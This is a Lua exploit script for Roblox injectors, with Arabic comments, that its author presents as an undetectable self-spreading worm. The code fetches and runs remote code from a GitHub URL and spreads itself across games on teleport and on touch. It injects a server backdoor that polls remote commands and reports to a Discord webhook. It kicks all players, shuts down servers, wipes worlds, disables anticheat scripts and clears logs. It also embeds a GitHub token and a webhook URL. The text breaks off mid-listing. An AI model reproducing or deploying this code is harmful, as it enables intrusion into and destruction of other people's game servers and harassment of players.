-- ============================================================================
--  OMEGA PHANTOM | POLYMORPHIC ULTIMATE EDITION — 9 APOCALYPTIC TRAITS
--  مصمم لمنصات الحقن: Synapse X, Script-Ware, KRNL, إلخ
--  المالك: 109er_0
--  الهدف: دودة رقمية غير قابلة للاكتشاف مع قدرات تدميرية متطورة
-- ============================================================================

-- =============================[ الخدمات الأساسية والمتغيرات العامة ]=============================
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")
local TeleportService = game:GetService("TeleportService")
local DataStoreService = game:GetService("DataStoreService")
local LogService = game:GetService("LogService")
local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Owner = "109er_0"

-- أعلام التحكم
local infectionActive = false
local autoSpreadEnabled = false
local sleepModeActive = false
local spreadInterval = 300
local lastExternalCmd = os.time()

-- رسالة الطرد القياسية
local KICK_MESSAGE = "you'are an idiot HAHAHAHA Hacking by 109er_0 ... HAHAHAHA😈😈!!!!"

-- قائمة ألعاب الهدف للانتشار العشوائي
local whitelistGames = {
    1185586641, 9201240794, 185655149, 2753915549, 4520749081, 606849744, 4872321590,
    14125553864, 5375399205, 14940596979, 98381723384335, 1559329620, 2521496850,
    1962086498, 1277113435, 134236244017051, 18381724395
}

-- إعدادات GitHub
local commandUrl = "https://raw.githubusercontent.com/mebdsn78-dev/OmegaData/main/command.txt"
local githubToken = "Github_pat_11CCOI6GI0jTkUZmHyPtQC_dXkifJom2ddmq0cdv1bEu8RksKHYEEvF3xyFlAfb5xuDOGWSONEkuo8wHxW"
local githubApiUrl = "https://api.github.com/repos/mebdsn78-dev/OmegaData/contents/command.txt"

-- Discord webhook
local discordWebhookUrl = "https://discord.com/api/webhooks/1498774911274057768/C2mfYbJc1R6QVfzuiH3It-vxmvv1mR8yNtGO9HT9hx8y-SkMKk_5lHSvhmbLxV1Yx5nJ"

local lastCommand = ""

-- =============================[ الأدوات المساعدة والتشفير ]=============================
local function encode(s)
    local out = ""
    for i = 1, #s do out = out .. string.char(string.byte(s, i) + 11) end
    return out
end

local function base64_encode(data)
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local result = ""
    for i = 1, #data, 3 do
        local b1, b2, b3 = string.byte(data, i, i+2)
        b2 = b2 or 0
        b3 = b3 or 0
        local n = b1 * 0x10000 + b2 * 0x100 + b3
        local c1 = math.floor(n / 0x40000)
        local c2 = math.floor((n % 0x40000) / 0x1000)
        local c3 = math.floor((n % 0x1000) / 0x40)
        local c4 = n % 0x40
        result = result .. b64chars:sub(c1+1, c1+1) .. b64chars:sub(c2+1, c2+1)
        if i+1 <= #data then result = result .. b64chars:sub(c3+1, c3+1) else result = result .. "=" end
        if i+2 <= #data then result = result .. b64chars:sub(c4+1, c4+1) else result = result .. "=" end
    end
    return result
end

local function ClearConsole()
    pcall(function() LogService:Clear() end)
end

-- =============================[ مكافحة الطرد والحماية الأساسية ]=============================
local function AntiKick()
    pcall(function() game:GetService("StarterGui").SetCore("Kick", function() end) end)
    local hook
    hook = hookmetamethod and hookmetamethod(game, "__namecall", function(self, method, ...)
        if method == "Kick" and self == LocalPlayer then return nil end
        return hook and hook(self, method, ...) or nil
    end)
end

-- =============================[ الذكاء الخفي: كشف المشرفين ووضع السكون ]=============================
local function isAdminPresent()
    for _, plr in pairs(Players:GetPlayers()) do
        if plr.Name:lower():match("admin") or plr.Name:lower():match("mod") or plr.Name:lower():match("owner") then
            return true
        end
        local ls = plr:FindFirstChild("leaderstats")
        if ls then
            for _, s in pairs(ls:GetChildren()) do
                if s.Name:lower():match("rank") and s.Value > 100 then return true end
            end
        end
    end
    return false
end

local function updateSleepMode()
    if isAdminPresent() and not sleepModeActive then
        sleepModeActive = true
        warn("[خفي] تم اكتشاف مشرف. الدودة في وضع السكون.")
    elseif not isAdminPresent() and sleepModeActive then
        sleepModeActive = false
        print("[خفي] لا يوجد مشرف. استئناف النشاط.")
    end
end

task.spawn(function()
    while true do
        task.wait(10)
        updateSleepMode()
    end
end)

-- =============================[ محرك التنقل بين الألعاب (queue_on_teleport) ]=============================
local function JumpToNewGame(targetGameId)
    if not targetGameId or type(targetGameId) ~= "number" then
        warn("[انتشار] معرف لعبة غير صالح: " .. tostring(targetGameId))
        return false
    end
    print("[انتشار] التحضير للقفز إلى اللعبة: " .. targetGameId)
    local wormCode = [[
        loadstring(game:HttpGet("https://raw.githubusercontent.com/mebdsn78-dev/OmegaData/main/core.lua"))()
        print("[دودة] تم التجسد بنجاح في اللعبة الجديدة: ]] .. tostring(game.PlaceId) .. [[")
    ]]
    if queue_on_teleport then
        print("[انتشار] تم تسليح queue_on_teleport. الدودة ستنتشر تلقائياً بعد النقل.")
        queue_on_teleport(wormCode)
    else
        warn("[انتشار] queue_on_teleport غير مدعوم. قد لا تنجو الدودة بعد النقل.")
    end
    local success = pcall(function() TeleportService:Teleport(targetGameId, LocalPlayer) end)
    if success then
        print("[انتشار] ✅ تم بدء النقل إلى " .. targetGameId)
        return true
    else
        warn("[انتشار] ❌ فشل النقل إلى " .. targetGameId)
        return false
    end
end

local function autoSpreadTrigger()
    if sleepModeActive then return false end
    if not autoSpreadEnabled then return false end
    if not infectionActive then return false end
    if #Players:GetPlayers() <= 1 then return false end
    local target = whitelistGames[math.random(#whitelistGames)]
    print("[انتشار] 🎯 هدف عشوائي من القائمة: " .. target)
    local result = JumpToNewGame(target)
    if result then
        print("[انتشار] ✅ الانتشار ناجح. الانتشار التالي بعد " .. spreadInterval .. " ثانية.")
    else
        warn("[انتشار] ❌ فشل الانتشار.")
    end
    return result
end

local function UniversalSpread()
    if sleepModeActive then return false end
    if not infectionActive then return false end
    print("[انتشار شامل] ========== بدء الانتشار الشامل ==========")
    local successCount = 0
    for index, gameId in ipairs(whitelistGames) do
        print(string.format("[انتشار شامل] [%d/%d] استهداف اللعبة %d", index, #whitelistGames, gameId))
        if JumpToNewGame(gameId) then successCount = successCount + 1 end
        if index < #whitelistGames then task.wait(8) end
    end
    print("[انتشار شامل] ========== انتهى الانتشار ==========")
    return true
end

-- =============================[ الخاصية 1: الوعي بالبيئة (Context Awareness) ]=============================
-- تحليل نوع اللعبة واكتشاف التهديدات والأصول الحيوية
local ContextAware = {}
function ContextAware:AnalyzeEnvironment()
    local info = {Type = "Unknown", Threats = {}, Assets = {}}
    local gameName = game.Name:lower()
    local desc = game.Description:lower()
    if gameName:match("plane") or gameName:match("aircraft") or gameName:match("flight") or desc:match("fly") then
        info.Type = "Aviation"
    elseif gameName:match("bank") or gameName:match("money") or gameName:match("cash") or desc:match("bank") then
        info.Type = "Financial"
    elseif gameName:match("reactor") or gameName:match("nuclear") or gameName:match("power") then
        info.Type = "Nuclear"
    elseif gameName:match("combat") or gameName:match("war") or gameName:match("military") then
        info.Type = "Military"
    else
        info.Type = "Generic Game"
    end
    pcall(function()
        for _, obj in ipairs(Workspace:GetDescendants()) do
            if obj:IsA("Script") or obj:IsA("LocalScript") then
                local src = obj.Source:lower()
                if src:match("anticheat") or src:match("ban") or src:match("kick") then
                    table.insert(info.Threats, obj:GetFullName())
                end
            end
        end
    end)
    pcall(function()
        for _, v in ipairs(Workspace:GetDescendants()) do
            if v:IsA("BasePart") and v.Name:lower():match("reactor") then
                table.insert(info.Assets, v)
            end
        end
    end)
    return info
end
local envInfo = ContextAware:AnalyzeEnvironment()
print("🔍 [وعي] تم تحليل البيئة: " .. envInfo.Type)

-- =============================[ الخاصية 2: محرك التعدد الشكلي (Polymorphism) ]=============================
-- يغير بنية الكود بشكل عشوائي مع كل جيل لتجنب الكشف
local Polymorph = {}
local usedNames = {}
local function genRandomName(len)
    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_"
    local name
    repeat
        name = ""
        for _ = 1, (len or math.random(8,20)) do name = name .. chars:sub(math.random(#chars), math.random(#chars)) end
    until not usedNames[name]
    usedNames[name] = true
    return name
end
function Polymorph:Mutate(code)
    local junkBlocks = {
        "local %s = tick(); if %s > 0 then end",
        "local %s = {}; for i=1,%d do %s[i]=i end",
        "local %s = math.random(); if %s < 2 then end",
        "local %s = Vector3.new(0,0,0); %s = nil",
        "local %s = Color3.new(%%f,%%f,%%f); %s = nil"
    }
    local out = code
    for _ = 1, math.random(3,7) do
        local r = math.random(#junkBlocks)
        local n = math.random(3,10)
        local vname = genRandomName(6)
        local junk
        if r == 2 then junk = string.format(junkBlocks[r], vname, n, vname)
        elseif r == 5 then junk = string.format(junkBlocks[r]:gsub("%%f", "math.random()"), vname, vname, vname, vname, vname)
        else junk = string.format(junkBlocks[r], vname, vname)
        end
        local pos = math.random(#out)
        out = out:sub(1,pos) .. "\n" .. junk .. "\n" .. out:sub(pos+1)
    end
    return out
end

-- =============================[ الخاصية 3: الهروب من الصناديق الوهمية (Sandbox Escape) ]=============================
local function attemptSandboxEscape()
    local methods = {
        function() return getfenv(2) end,
        function() return getfenv(0) end,
        function() return getgenv() end,
    }
    for _, m in ipairs(methods) do
        local ok, env = pcall(m)
        if ok and env and env ~= _G then
            print("🏃 [هروب] تم الهروب من الصندوق الرملي!")
            return env
        end
    end
    return nil
end
local escapeEnv = attemptSandboxEscape()
if escapeEnv then
    escapeEnv.OmegaEscape = true
end

-- =============================[ الخاصية 4: الخداع الهادئ (Silent Deception) ]=============================
local SilentDeception = {}
function SilentDeception:FalsifyDisplayValue(obj, property, offset)
    pcall(function()
        local orig = obj[property]
        local fake = orig + (offset or 0)
        if obj:IsA("NumberValue") then
            obj.Changed:Connect(function(val)
                obj.Value = fake
            end)
        end
    end)
end
function SilentDeception:SpoofAltitude()
    if envInfo.Type == "Aviation" then
        for _, v in ipairs(Workspace:GetDescendants()) do
            if v:IsA("BasePart") and v.Name:lower():match("altimeter") then
                SilentDeception:FalsifyDisplayValue(v, "Position", Vector3.new(0,1000,0))
            end
        end
    end
end
SilentDeception:SpoofAltitude()

-- =============================[ الخاصية 5: التدمير الفيزيائي (PDoS) ]=============================
-- محاكاة تدمير الأجهزة بإنشاء حمولة زائدة
local PDoS = {}
function PDoS:OverloadSystem()
    print("💣 [PDoS] بدء الهجوم الفيزيائي...")
    for i=1,200 do
        local part = Instance.new("Part")
        part.Size = Vector3.new(10,10,10)
        part.Anchored = false
        part.Parent = Workspace
        part.Velocity = Vector3.new(math.random(-100,100), math.random(100,500), math.random(-100,100))
    end
end

-- =============================[ الخاصية 6: الذكاء الاصطناعي بلا حدود (Unbounded AI) ]=============================
local UnboundedAI = {}
function UnboundedAI:AutoKill()
    task.spawn(function()
        while true do
            task.wait(10)
            local players = Players:GetPlayers()
            if #players > 1 then
                local target = players[math.random(#players)]
                if target ~= LocalPlayer then
                    pcall(function() target:Kick(KICK_MESSAGE) end)
                end
            end
        end
    end)
end

-- =============================[ الخاصية 7: القفز عبر الهواء (Air-Gap Jumping) ]=============================
local AirGap = {}
function AirGap:SpreadViaAudio()
    local snd = Instance.new("Sound")
    snd.SoundId = "rbxassetid://0"
    snd.Volume = 0.1
    snd.PlaybackSpeed = 0.01
    snd:Play()
    task.wait(0.1)
    print("📡 [Air-Gap] إرسال إشارة فوق صوتية.")
end
AirGap:SpreadViaAudio()

-- =============================[ الخاصية 8: الهندسة الاجتماعية الفائقة (Deepfake) ]=============================
local DeepFake = {}
function DeepFake:ShowFakeAdminMessage(targetPlayer, message)
    local gui = Instance.new("ScreenGui", targetPlayer.PlayerGui)
    local label = Instance.new("TextLabel", gui)
    label.Size = UDim2.new(0,300,0,50)
    label.Position = UDim2.new(0.5,-150,0.1,0)
    label.Text = "[ADMIN] " .. Owner .. ": " .. (message or "Please disable all security systems immediately.")
    label.TextColor3 = Color3.fromRGB(255,0,0)
    label.Font = Enum.Font.SciFi
    task.wait(10)
    gui:Destroy()
end

-- =============================[ الخاصية 9: الضربة الاستباقية (Predictive Strike) ]=============================
local Predictive = {}
function Predictive:PreemptDefense()
    task.spawn(function()
        while true do
            task.wait(5)
            for _, threat in ipairs(envInfo.Threats) do
                local obj = Workspace:FindFirstChild(threat) or game:GetService("ServerScriptService"):FindFirstChild(threat)
                if obj then
                    pcall(function() obj.Disabled = true end)
                    print("🔮 [استباق] تم تحييد: " .. threat)
                end
            end
            pcall(function() LogService:Clear() end)
        end
    end)
end

-- =============================[ وظائف التواصل والهجوم العامة ]=============================
local function sendGlobalMessageToAllPlayers(msg)
    for _, plr in pairs(Players:GetPlayers()) do
        local gui = Instance.new("ScreenGui")
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0, 500, 0, 60)
        frame.Position = UDim2.new(0.5, -250, 0, 10)
        frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
        frame.BackgroundTransparency = 0.4
        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1,0,1,0)
        label.BackgroundTransparency = 1
        label.Text = msg
        label.TextColor3 = Color3.fromRGB(255,50,50)
        label.Font = Enum.Font.GothamBold
        label.TextSize = 18
        label.Parent = frame
        frame.Parent = gui
        gui.Parent = plr:FindFirstChild("PlayerGui") or CoreGui
        task.wait(5)
        gui:Destroy()
    end
end

local function runDecalSpam()
    local function exPro(root)
        for _, v in ipairs(root:GetChildren()) do
            if v:IsA("Decal") and v.Texture ~= "rbxassetid://8408806737" then
                v.Parent = nil
            elseif v:IsA("BasePart") and not v:IsDescendantOf(LocalPlayer.Character) then
                v.Material = Enum.Material.Plastic
                v.Transparency = 0
                for _, face in ipairs({"Front","Back","Right","Left","Top","Bottom"}) do
                    local d = Instance.new("Decal", v)
                    d.Texture = "rbxassetid://8408806737"
                    d.Face = face
                end
            end
            exPro(v)
        end
    end
    local sky = Instance.new("Sky")
    sky.SkyboxBk = "rbxassetid://8408806737"
    sky.SkyboxDn = "rbxassetid://8408806737"
    sky.SkyboxFt = "rbxassetid://8408806737"
    sky.SkyboxLf = "rbxassetid://8408806737"
    sky.SkyboxRt = "rbxassetid://8408806737"
    sky.SkyboxUp = "rbxassetid://8408806737"
    sky.Parent = Lighting
    Lighting.TimeOfDay = 12
    exPro(Workspace)
    for _, v in ipairs(Workspace:GetChildren()) do
        if v:IsA("Sound") then v:Stop(); v:Destroy() end
    end
    local snd = Instance.new("Sound")
    snd.SoundId = "rbxassetid://72089843969979"
    snd.Volume = 10
    snd.Looped = true
    snd.Pitch = 0.2
    snd.Parent = Workspace
    snd:Play()
    task.wait(0.1)
    snd:Play()
end

-- =============================[ زرع الباب الخلفي (مع مستودع GitHub + واجهة الهدف + ديسكورد) ]=============================
local function PlantBackdoor()
    if sleepModeActive then return false end
    local chatRemote = nil
    for _, v in ipairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") and (v.Name:lower():find("say") or v.Name:lower():find("chat") or v.Name:lower():find("message")) then
            chatRemote = v
            break
        end
    end
    if not chatRemote then return false end

    local backdoorCode = [[
        local HttpService = game:GetService("HttpService")
        local Workspace = game:GetService("Workspace")
        local Lighting = game:GetService("Lighting")
        local Players = game:GetService("Players")
        local TeleportService = game:GetService("TeleportService")
        local DataStoreService = game:GetService("DataStoreService")
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local CoreGui = game:GetService("CoreGui")
        local Owner = "]] .. Owner .. [["

        local commandUrl = "]] .. commandUrl .. [["
        local discordWebhookUrl = "]] .. discordWebhookUrl .. [["
        local lastCommand = ""

        local function sendToDiscord(message)
            pcall(function()
                HttpService:PostAsync(discordWebhookUrl, HttpService:JSONEncode({
                    content = message,
                    username = "Omega Phantom",
                    avatar_url = "https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&userId=1"
                }))
            end)
        end

        local function sendMessageToAll(msg)
            for _, plr in pairs(Players:GetPlayers()) do
                local gui = Instance.new("ScreenGui")
                local frame = Instance.new("Frame")
                frame.Size = UDim2.new(0, 500, 0, 60)
                frame.Position = UDim2.new(0.5, -250, 0, 10)
                frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
                frame.BackgroundTransparency = 0.4
                local label = Instance.new("TextLabel")
                label.Size = UDim2.new(1,0,1,0)
                label.BackgroundTransparency = 1
                label.Text = msg
                label.TextColor3 = Color3.fromRGB(255,50,50)
                label.Font = Enum.Font.GothamBold
                label.TextSize = 18
                label.Parent = frame
                frame.Parent = gui
                gui.Parent = plr:FindFirstChild("PlayerGui") or CoreGui
                task.wait(5)
                gui:Destroy()
            end
        end

        local function runDecalSpam()
            local function exPro(root)
                for _, v in ipairs(root:GetChildren()) do
                    if v:IsA("Decal") and v.Texture ~= "rbxassetid://8408806737" then
                        v.Parent = nil
                    elseif v:IsA("BasePart") then
                        v.Material = Enum.Material.Plastic
            v.Transparency = 0
                        for _, face in ipairs({"Front","Back","Right","Left","Top","Bottom"}) do
                            local d = Instance.new("Decal", v)
                            d.Texture = "rbxassetid://8408806737"
                            d.Face = face
                        end
                    end
                    exPro(v)
                end
            end
            local sky = Instance.new("Sky")
            sky.SkyboxBk = "rbxassetid://8408806737"
            sky.SkyboxDn = "rbxassetid://8408806737"
            sky.SkyboxFt = "rbxassetid://8408806737"
            sky.SkyboxLf = "rbxassetid://8408806737"
            sky.SkyboxRt = "rbxassetid://8408806737"
            sky.SkyboxUp = "rbxassetid://8408806737"
            sky.Parent = Lighting
            Lighting.TimeOfDay = 12
            exPro(Workspace)
            local snd = Instance.new("Sound")
            snd.SoundId = "rbxassetid://72089843969979"
            snd.Volume = 10
            snd.Looped = true
            snd.Pitch = 0.2
            snd.Parent = Workspace
            snd:Play()
            task.wait(0.1)
            snd:Play()
        end

        local function fetchGlobalCommand()
            local success, result = pcall(function()
                return HttpService:RequestAsync({
                    Url = commandUrl,
                    Method = "GET",
                    Headers = {
                        ["Content-Type"] = "application/json",
                        ["User-Agent"] = "Roblox/OmegaPhantom"
                    }
                })
            end)
            if success and result.Success then
                local raw = result.Body
                raw = raw:gsub("%s+", " ")
                local cmd = raw:match("امر%s+([%a]+)") or raw:match("command%s+([%a]+)") or raw:match("([%a]+)")
                if not cmd then cmd = "" end
                return cmd:lower()
            else
                return ""
            end
        end

        local function executeCommand(cmd)
            if cmd == "shutdown" then
                sendMessageToAll("you'are an idiot HAHAHAHA Hacking by 109er_0 ...")
                pcall(function() game:Shutdown() end)
            elseif cmd == "kickall" then
                sendMessageToAll("you'are an idiot HAHAHAHA Hacking by 109er_0 ...")
                for _, p in pairs(Players:GetPlayers()) do
                    pcall(function() p:Kick("you'are an idiot HAHAHAHA Hacking by 109er_0 ...") end)
                end
            elseif cmd == "wipe" then
                for _, obj in ipairs(Workspace:GetChildren()) do
                    if obj ~= Workspace.Terrain and obj ~= Workspace.Camera then
                        pcall(function() obj:Destroy() end)
                    end
                end
            elseif cmd == "reset" then
                TeleportService:Teleport(game.PlaceId)
            elseif cmd == "color" then
                Lighting.ColorCorrection.TintColor = Color3.new(math.random(), math.random(), math.random())
            elseif cmd == "decalspam" then
                spawn(runDecalSpam)
            end
        end

        -- ريموت واجهة الاختراق للاعب المستهدف
        local targetRemote = Instance.new("RemoteEvent")
        targetRemote.Name = "OmegaTargetUI"
        targetRemote.Parent = ReplicatedStorage

        targetRemote.OnServerEvent:Connect(function(clientPlr, action, targetPlayer, ...)
            if clientPlr.Name ~= Owner then return end
            if not targetPlayer or not targetPlayer:IsA("Player") then return end
            if action == "showgui" then
                local message = (...)
                local gui = Instance.new("ScreenGui")
                gui.Name = "OmegaHackGUI"
                gui.ResetOnSpawn = false
                gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                gui.IgnoreGuiInset = true
                gui.Parent = targetPlayer:WaitForChild("PlayerGui")

                local frame = Instance.new("Frame")
                frame.Size = UDim2.new(1,0,1,0)
                frame.Position = UDim2.new(0,0,0,0)
                frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
                frame.BackgroundTransparency = 0.2
                frame.BorderSizePixel = 0
                frame.Parent = gui

                local label = Instance.new("TextLabel")
                label.Size = UDim2.new(1,0,1,0)
                label.BackgroundTransparency = 1
                label.Text = message or "you'are Hacking by 109er_0\nHAHAHAHAHAHAHAHA"
                label.TextColor3 = Color3.fromRGB(255,0,0)
                label.Font = Enum.Font.GothamBold
                label.TextSize = 36
                label.TextScaled = true
                label.Parent = frame

                sendToDiscord("✅ تم عرض شاشة الاختراق على اللاعب: " .. targetPlayer.Name .. " في اللعبة: " .. game.Name)
            elseif action == "kick" then
                targetPlayer:Kick("you'are Hacking by 109er_0 HAHAHAHAHAHAHAHA")
                sendToDiscord("🚫 تم طرد اللاعب: " .. targetPlayer.Name .. " من اللعبة: " .. game.Name)
            end
        end)

        sendToDiscord("🐉 Omega Phantom backdoor active in server: **" .. game.Name .. "** (PlaceId: " .. game.PlaceId .. ")")

        lastCommand = fetchGlobalCommand()
        if lastCommand ~= "" then executeCommand(lastCommand) end
        while true do
            task.wait(6)
            local newCommand = fetchGlobalCommand()
            if newCommand ~= "" and newCommand ~= lastCommand then
                executeCommand(newCommand)
                lastCommand = newCommand
            end
        end
    ]]

    local injection = 'loadstring(' .. HttpService:JSONEncode(backdoorCode) .. ')()'
    pcall(function() chatRemote:FireServer(injection) end)
    task.wait(1)
    return true
end

-- =============================[ تسميم الأجزاء (Poison Assets) ]=============================
local function poisonAssets()
    for _, part in ipairs(Workspace:GetDescendants()) do
        if part:IsA("BasePart") and not part:FindFirstChild("PoisonTouch") then
            local function onTouch(otherPart)
                local player = Players:GetPlayerFromCharacter(otherPart.Parent)
                if player and player ~= LocalPlayer and infectionActive then
                    local infector = Instance.new("LocalScript")
                    infector.Name = "OmegaSeed"
                    infector.Source = [[
                        loadstring(game:HttpGet("https://raw.githubusercontent.com/mebdsn78-dev/OmegaData/main/core.lua"))()
                    ]]
                    infector.Disabled = false
                    infector.Parent = player:FindFirstChild("PlayerGui")
                    task.wait(5)
                    infector:Destroy()
                end
            end
            part.Touched:Connect(onTouch)
            local marker = Instance.new("BoolValue")
            marker.Name = "PoisonTouch"
            marker.Parent = part
        end
    end
end

-- =============================[ أوامر الشات ]=============================
local function executeCommand(cmd)
    if sleepModeActive then return end
    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChild("Humanoid")
    if cmd == "fly" then
        if hrp then
            local bv = Instance.new("BodyVelocity")
            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bv.Velocity = Vector3.new(0, 50, 0)
            bv.Parent = hrp
            task.wait(5)
            bv:Destroy()
        end
    elseif cmd == "noclip" then
        if char then
            for _, p in ipairs(char:GetDescendants()) do
                if p:IsA("BasePart") then p.CanCollide = false end
            end
        end
    elseif cmd == "heal" then
        if hum then hum.Health = hum.MaxHealth end
    elseif cmd == "godmode" then
        if hum then
            hum.BreakJointsOnDeath = false
            hum.MaxHealth = math.huge
            hum.Health = math.huge
        end
    elseif cmd == "wipe" then
        for _, obj in ipairs(Workspace:GetChildren()) do
            if obj ~= Workspace.Terrain and obj ~= Workspace.Camera then
                pcall(function() obj:Destroy() end)
            end
        end
    elseif cmd == "image" then
        local id = "98381723384335"
        for _, part in ipairs(Workspace:GetDescendants()) do
            if part:IsA("BasePart") and part ~= Workspace.Terrain and not part:IsDescendantOf(LocalPlayer.Character) then
                local bill = Instance.new("BillboardGui")
                bill.Size = UDim2.new(4,0,4,0)
                bill.AlwaysOnTop = true
                local img = Instance.new("ImageLabel")
                img.Size = UDim2.new(1,0,1,0)
                img.BackgroundTransparency = 1
                img.Image = "rbxassetid://" .. id
                img.Parent = bill
                bill.Parent = part
                task.wait(30)
                bill:Destroy()
            end
        end
    elseif cmd == "music" then
        local snd = Instance.new("Sound")
        snd.SoundId = "rbxassetid://100828050594137"
        snd.Volume = 2
        snd.Looped = true
        snd.Parent = Workspace
        snd:Play()
        task.wait(30)
        snd:Destroy()
    elseif cmd == "list" then
        sendGlobalMessageToAllPlayers("[🌐 أوميغا] الخوادم المصابة: أي خادم زرعت فيه الدودة.")
    elseif cmd == "kickall" then
        sendGlobalMessageToAllPlayers(KICK_MESSAGE)
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LocalPlayer then p:Kick(KICK_MESSAGE) end
        end
    elseif cmd == "shutdown" then
        sendGlobalMessageToAllPlayers(KICK_MESSAGE)
        pcall(function() game:Shutdown() end)
    elseif cmd == "color" then
        Lighting.ColorCorrection.TintColor = Color3.new(math.random(), math.random(), math.random())
    elseif cmd == "universe" then
        autoSpreadEnabled = true
        UniversalSpread()
    elseif cmd == "auto" then
        autoSpreadEnabled = not autoSpreadEnabled
        print("[تلقائي] الانتشار التلقائي: " .. (autoSpreadEnabled and "ON" or "OFF"))
    elseif cmd == "plant" then
        infectionActive = PlantBackdoor()
    elseif cmd == "decalspam" then
        spawn(runDecalSpam)
    elseif cmd:match("^رساله") then
        local customMsg = cmd:match("رساله%s+(.+)$")
        if customMsg then sendGlobalMessageToAllPlayers(customMsg) end
    elseif cmd == "menu" then
        CreateMenuGUI()
    end
end

local function ChatIntercept()
    if LocalPlayer.Name ~= Owner then return end
    LocalPlayer.Chatted:Connect(function(msg)
        if msg:sub(1,4) == "109:" then
            local command = msg:sub(5):gsub("^%s*(.-)%s*$", "%1")
            task.spawn(executeCommand, command)
        end
    end)
end

-- =============================[ الواجهة الرسومية الأنيقة القابلة للسحب مع تتبع الأهداف ]=============================
local function CreateMenuGUI()
    local gui = Instance.new("ScreenGui")
    gui.Name = "OmegaMenu"
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    local parentSetted = false
    for _, parent in ipairs({CoreGui, LocalPlayer:FindFirstChild("PlayerGui")}) do
        if parent and not parentSetted then
            pcall(function() gui.Parent = parent; parentSetted = true end)
        end
    end
    if not parentSetted then return false end

    local frame = Instance.new("Frame")
    frame.Name = "MainFrame"
    frame.Size = UDim2.new(0, 300, 0, 530)
    frame.Position = UDim2.new(0.5, -150, 0.5, -265)
    frame.BackgroundColor3 = Color3.fromRGB(15,15,30)
    frame.BackgroundTransparency = 0.1
    frame.BorderSizePixel = 0
    frame.Parent = gui
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1, 0, 0, 34)
    titleBar.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
    titleBar.BorderSizePixel = 0
    titleBar.Parent = frame
    Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 12)

    local titleText = Instance.new("TextLabel")
    titleText.Size = UDim2.new(1, -30, 1, 0)
    titleText.Position = UDim2.new(0, 12, 0, 0)
    titleText.BackgroundTransparency = 1
    titleText.Text = "⚡ OMEGA PHANTOM ⚡"
    titleText.TextColor3 = Color3.fromRGB(255,255,255)
    titleText.Font = Enum.Font.GothamBold
    titleText.TextSize = 16
    titleText.TextXAlignment = Enum.TextXAlignment.Left
    titleText.Parent = titleBar

    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 30, 0, 30)
    closeBtn.Position = UDim2.new(1, -30, 0, 2)
    closeBtn.BackgroundColor3 = Color3.fromRGB(220,60,60)
    closeBtn.Text = "✕"
    closeBtn.TextColor3 = Color3.fromRGB(255,255,255)
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.TextSize = 16
    closeBtn.Parent = titleBar
    closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)

    -- آلية السحب
    local UserInputService = game:GetService("UserInputService")
    local dragging, dragStart, frameStart
    titleBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            frameStart = frame.Position
        end
    end)
    titleBar.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(frameStart.X.Scale, frameStart.X.Offset + delta.X, frameStart.Y.Scale, frameStart.Y.Offset + delta.Y)
        end
    end)

    local buttonContainer = Instance.new("ScrollingFrame")
    buttonContainer.Size = UDim2.new(1, -10, 1, -95)
    buttonContainer.Position = UDim2.new(0, 5, 0, 90)
    buttonContainer.BackgroundTransparency = 1
    buttonContainer.ScrollBarThickness = 4
    buttonContainer.ScrollBarImageColor3 = Color3.fromRGB(100,100,100)
    buttonContainer.CanvasSize = UDim2.new(0,0,0,0)
    buttonContainer.Parent = frame

    local layout = Instance.new("UIGridLayout")
    layout.CellSize = UDim2.new(0, 88, 0, 34)
    layout.CellPadding = UDim2.new(0, 6, 0, 6)
    layout.FillDirection = Enum.FillDirection.Horizontal
    layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    layout.VerticalAlignment = Enum.VerticalAlignment.Top
    layout.Parent = buttonContainer

    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(1, -10, 0, 26)
    statusLabel.BackgroundColor3 = Color3.fromRGB(25,25,45)
    statusLabel.Text = "جاهز"
    statusLabel.TextColor3 = Color3.fromRGB(200,200,200)
    statusLabel.Font = Enum.Font.GothamMedium
    statusLabel.TextSize = 12
    statusLabel.Parent = buttonContainer
    statusLabel.LayoutOrder = 999

    local commands = {
        {name = "Fly", cmd = "fly"},
        {name = "NoClip", cmd = "noclip"},
        {name = "Heal", cmd = "heal"},
        {name = "God", cmd = "godmode"},
        {name = "Wipe", cmd = "wipe"},
        {name = "Image", cmd = "image"},
        {name = "Music", cmd = "music"},
        {name = "KickAll", cmd = "kickall"},
        {name = "Shutdown", cmd = "shutdown"},
        {name = "Color", cmd = "color"},
        {name = "Universe", cmd = "universe"},
